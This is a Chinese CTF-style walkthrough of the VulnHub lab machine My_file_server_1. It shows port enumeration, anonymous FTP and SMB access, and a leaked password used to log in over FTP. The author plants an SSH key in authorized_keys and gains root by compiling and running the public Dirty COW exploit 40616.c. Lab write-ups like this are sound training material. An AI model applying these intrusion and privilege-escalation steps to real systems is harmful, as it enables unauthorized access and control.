# 靶机信息
My_file_server_1是vulnhub中的一台简单难度的渗透测试靶机
# 初始信息枚举
端口开放情况
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/MyFileServer1]
└─$ sudo nmap -sT -p$ports -sV -O $ip -oA nmapScan/detail                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-29 08:17 EDT
Nmap scan report for 192.168.218.196
Host is up (0.00039s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 3.0.2
22/tcp    open  ssh         OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http        Apache httpd 2.4.6 ((CentOS))
111/tcp   open  rpcbind     2-4 (RPC #100000)
445/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: SAMBA)
2049/tcp  open  nfs_acl     3 (RPC #100227)
2121/tcp  open  ftp         ProFTPD 1.3.5
20048/tcp open  mountd      1-3 (RPC #100005)
MAC Address: 00:0C:29:70:8E:E9 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc|router
Running (JUST GUESSING): Linux 2.6.X|3.X|4.X|5.X (97%), Synology DiskStation Manager 5.X (97%), MikroTik RouterOS 7.X (90%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6.0 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
Aggressive OS guesses: Linux 2.6.32 - 3.13 (97%), Linux 3.4 - 3.10 (97%), Synology DiskStation Manager 5.2-5644 (97%), Linux 2.6.32 - 3.10 (97%), Linux 2.6.39 (97%), Linux 3.10 (95%), Linux 2.6.32 (94%), Linux 2.6.32 - 3.5 (92%), Linux 3.2 - 3.10 (91%), Linux 3.2 - 3.16 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: FILESERVER; OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds
```

漏洞扫描也没扫出来什么漏洞。
先分析一下以往少见的开放端口协议

>111/tcp — rpcbind (RPC 端口绑定器)
协议： Remote Procedure Call（远程过程调用）
用途： 映射 RPC 服务（如 NFS、mountd、rstat）
服务版本： RPC v2-4
信息泄露（列出开放的 RPC 服务）
利用组合服务进行提权（如 NFS/mountd）
rpcinfo -p <IP> 查看服务
>与 NFS/mountd 搭配使用，尝试挂载文件系统

>445/tcp — Samba SMB (Samba smbd 3.X - 4.X)
协议： SMB（Server Message Block）
用途： 文件共享、打印服务、远程管理
服务版本： Samba 3.x~4.x
未授权共享访问
弱口令攻击
提权漏洞（如 CVE-2017-7494，远程代码执行）
EternalBlue（445端口，影响Win）
枚举共享资源：smbclient -L //<IP>
尝试连接共享：smbclient //<IP>/share
>利用 smbmap, enum4linux, crackmapexec

>2049/tcp — NFS (nfs_acl)
协议： Network File System
用途： 网络文件系统共享（Linux/Unix环境常见）
服务版本： NFSv3（常见）
匿名挂载：无需身份验证即可挂载远程目录
权限配置错误（如 root_squash 关闭）
枚举可挂载点：showmount -e <IP>
尝试挂载：mount -t nfs <IP>:/export /mnt/nfs
>查找敏感文件（如私钥、配置文件）

>20048/tcp — mountd (NFS 组件)
协议： NFS Mount Daemon
用途： 支持 NFS 客户端挂载远程目录
服务版本： RPC #100005 v1-3
配置不当导致任意用户可挂载
与 NFS、rpcbind 配合使用，构成完整远程文件系统访问路径
与 rpcbind、nfs 联动，挂载系统目录
>查看是否可读取敏感目录如 /etc, /home


# FTP枚举
21和2121端口都可以匿名登录，但是两个端口的可访问文件好像都是一样的，都是各种服务的log文件，有一个secure文件，但是没有权限下载。

<img width="1593" height="765" alt="Image" src="https://github.com/user-attachments/assets/6f8e0360-3e49-4a59-b077-85d25759de0f" />

# SMB枚举
有如下共享
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/MyFileServer1]
└─$ smbclient -L //$ip -N  
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        smbdata         Disk      smbdata
        smbuser         Disk      smbuser
        IPC$            IPC       IPC Service (Samba 4.9.1)
Reconnecting with SMB1 for workgroup listing.
```
smbdata可以匿名登录，资源也是跟ftp的资源一样呢，smbuser，无法访问
尝试使用NFS挂载，但是也只能挂载smbdata
这些网络协议接触的不多，不是很会。先看80端口

# WBE枚举
扫描目录只扫出来一个readme.txt  页面包含  **My Password is  rootroot1** 
有了密码试一下所有可以登录的服务
上面使用 **enum4Linux -a $ip** 可以扫到一个smbuser用户，试一下登录smb，ftp等服务
成功登录ftp服务
```
ftp> ls -la
229 Entering Extended Passive Mode (|||5744|).
150 Here comes the directory listing.
dr-xr-xr-x   18 0        0            4096 Feb 18  2020 .
dr-xr-xr-x   18 0        0            4096 Feb 18  2020 ..
-rw-r--r--    1 0        0               0 Feb 18  2020 .autorelabel
lrwxrwxrwx    1 0        0               7 Feb 18  2020 bin -> usr/bin
dr-xr-xr-x    4 0        0            4096 Feb 18  2020 boot
drwxr-xr-x   18 0        0            2940 Jul 29 20:09 dev
drwxr-xr-x   86 0        0            8192 Jul 29 20:09 etc
drwxr-xr-x    3 0        0              20 Feb 19  2020 home
lrwxrwxrwx    1 0        0               7 Feb 18  2020 lib -> usr/lib
lrwxrwxrwx    1 0        0               9 Feb 18  2020 lib64 -> usr/lib64
drwxr-xr-x    2 0        0               6 Jun 10  2014 media
drwxr-xr-x    2 0        0               6 Jun 10  2014 mnt
drwxr-xr-x    3 0        0              21 Feb 18  2020 opt
dr-xr-xr-x  177 0        0               0 Jul 29 20:09 proc
drwxr--r--    4 0        0            4096 Feb 20  2020 root
drwxr-xr-x   26 0        0             900 Jul 29 20:09 run
lrwxrwxrwx    1 0        0               8 Feb 18  2020 sbin -> usr/sbin
drwxrwxrwx    8 0        0            4096 Jul 29 20:26 smbdata
drwxr-xr-x    2 0        0               6 Jun 10  2014 srv
dr-xr-xr-x   13 0        0               0 Jul 29 20:09 sys
drwxrwxrwt    8 0        0            4096 Jul 29 21:48 tmp
drwxr-xr-x   13 0        0            4096 Feb 18  2020 usr
drwxr-xr-x   22 0        0            4096 Feb 19  2020 var
226 Directory send OK.
ftp> 
```
已经有了初始访问权限，想登录ssh但是提示不允许密码登录，正好ftp登录上了，上传我的公钥上去
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/MyFileServer1]
└─$ ssh-keygen -t rsa -b 2048 -f mykey

Generating public/private rsa key pair.
Enter passphrase for "mykey" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in mykey
Your public key has been saved in mykey.pub
The key fingerprint is:
SHA256:g+FdeXXpZJw8CXX3hnDlu1NrZSprMwoxOKhGtauDroc kali@kali
The key's randomart image is:
+---[RSA 2048]----+
|            ..BoO|
|           . + &+|
|    . .   o . = =|
|   . + = . .   o.|
|  . o = S      .+|
| . . . . +     o=|
| oo .   .   . .= |
|E.o.     .  +o. .|
|+o..      .o.o   |
+----[SHA256]-----+
```
先本地生成公钥和私钥，在使用ftp将公钥put上去放到保存未/home/smbuser/.ssh/authorized_keys
再使用本地私钥登录。

# 提权
用户smbuser不能执行sudo。
找了定时计划，也没找到什么东西。
web源码也没有东西。
吸取之前的教训尝试内核提权
```
┌──(kali㉿kali)-[/usr/…/exploitdb/exploits/linux/dos]
└─$ searchsploit 3.10.0    
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - 'aiptek' Nullpointer Dereference                                                                                        | linux/dos/39544.txt
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - 'cdc_acm' Nullpointer Dereference                                                                                       | linux/dos/39543.txt
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - 'cypress_m8' Nullpointer Dereference                                                                                    | linux/dos/39542.txt
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - 'digi_acceleport' Nullpointer Dereference                                                                               | linux/dos/39537.txt
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - 'mct_u232' Nullpointer Dereference                                                                                      | linux/dos/39541.txt
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - 'Wacom' Multiple Nullpointer Dereferences                                                                               | linux/dos/39538.txt
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - visor 'treo_attach' Nullpointer Dereference                                                                             | linux/dos/39539.txt
Linux Kernel 3.10.0 (CentOS / RHEL 7.1) - visor clie_5_attach Nullpointer Dereference                                                                             | linux/dos/39540.txt
Linux Kernel 3.10.0 (CentOS 7) - Denial of Service                                                                                                                | linux/dos/41350.c
Linux Kernel 3.10.0-229.x (CentOS / RHEL 7.1) - 'iowarrior' Driver Crash (PoC)                                                                                    | linux/dos/39556.txt
Linux Kernel 3.10.0-229.x (CentOS / RHEL 7.1) - 'snd-usb-audio' Crash (PoC)                                                                                       | linux/dos/39555.txt
Linux Kernel 3.10.0-514.21.2.el7.x86_64 / 3.10.0-514.26.1.el7.x86_64 (CentOS 7) - SUID Position Independent Executable 'PIE' Local Privilege Escalation           | linux/local/42887.c
Linux Kernel 4.8.0-22/3.10.0-327 (Ubuntu 16.10 / RedHat) - 'keyctl' Null Pointer Dereference                                                                      | linux/dos/40762.c
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
找到一个本地提权的poc，试一下，文件需要包含包含一个rootshell.h文件，但是没找到
上传linpeas扫一下，脏牛漏洞概率很大。
https://www.exploit-db.com/download/40611
https://www.exploit-db.com/download/40839
试了这两个都没成
```
└─$ searchsploit dirty Cow
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1)                                                                                            | linux/dos/43199.c
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2)                                                                                            | linux/dos/44305.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (SUID Method)                                                | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passwd Method)                                                   | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)                                                                      | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)                                                | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method)                                                                       | linux/local/40611.c
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
再试一下这些 **local poc**
编译执行40616这个poc的时候成功了
```
[smbuser@fileserver ~]$ gcc 40616.c -o poc -pthread
40616.c: 在函数‘procselfmemThread’中:
40616.c:99:9: 警告：传递‘lseek’的第 2 个参数时将指针赋给整数，未作类型转换 [默认启用]
         lseek(f,map,SEEK_SET);
         ^
In file included from 40616.c:28:0:
/usr/include/unistd.h:334:16: 附注：需要类型‘__off_t’，但实参的类型为‘void *’
 extern __off_t lseek (int __fd, __off_t __offset, int __whence) __THROW;
                ^
[smbuser@fileserver ~]$ ./poc 
DirtyCow root privilege escalation
Backing up /usr/bin/passwd.. to /tmp/bak
Size of binary: 27832
Racing, this may take a while..
thread stopped
thread stopped

/usr/bin/passwd is overwritten
Popping root shell.
Don't forget to restore /tmp/bak
[root@fileserver smbuser]# 
```

# 反思
前面扫描端口的时候会影响初期的打点，害得我一直在利用smb找信息，导致我在拿到ftp登录密码之后还是不知道使用，也对得起这个靶机名，全是文件服务。再就是最后的提权姿势，试了很多内核提权都不行，一度让我觉得不是这个利用路径，最后在网上找到确定是内核漏洞，才试出来了。还得多练寻找内核提权对应poc的能力。